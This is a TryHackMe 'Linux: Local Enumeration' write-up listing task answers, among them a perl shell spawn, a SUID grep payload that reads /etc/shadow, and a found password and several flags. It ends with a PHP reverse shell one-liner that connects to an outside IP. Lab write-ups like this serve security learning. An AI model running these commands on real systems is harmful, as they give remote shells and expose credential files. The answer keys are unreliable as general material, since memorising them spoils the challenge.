# TryHackMe Linux: Local Enumeration


> Saikat Karmakar | Aug 15 : 2021

---

## Task 2

1. How would you execute /bin/bash with perl? 
```
perl -e 'exec "/bin/bash"
```

## Task 3

1. Where can you usually find the id_rsa file? (User = user)
```
/home/user/.ssh/id_rsa
```
2. Is there an id_rsa file on the box? (yay/nay)
```
nay
```

## Task 4

1. How would you print machine hardware name only?
```
uname -m
```
2. Where can you find bash history?
```
~/.bash_history 
```
3. What's the flag?
```
thm{clear_the_history}
```

## Task 5

1. Can you read /etc/passwd on the box? (yay/nay)
```
nay
``` 

## Task 6

1.  What's the password you found?
```
THMSkidyPass
```
2. Did you find a flag?
```
thm{conf_file}
```

## Task 7

1. Which SUID binary has a way to escalate your privileges on the box?
```
grep 
```
2. What's the payload you can use to read /etc/shadow with this SUID?
```
grep '' /etc/shadow
```




php -r '$sock=fsockopen("10.4.23.120",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
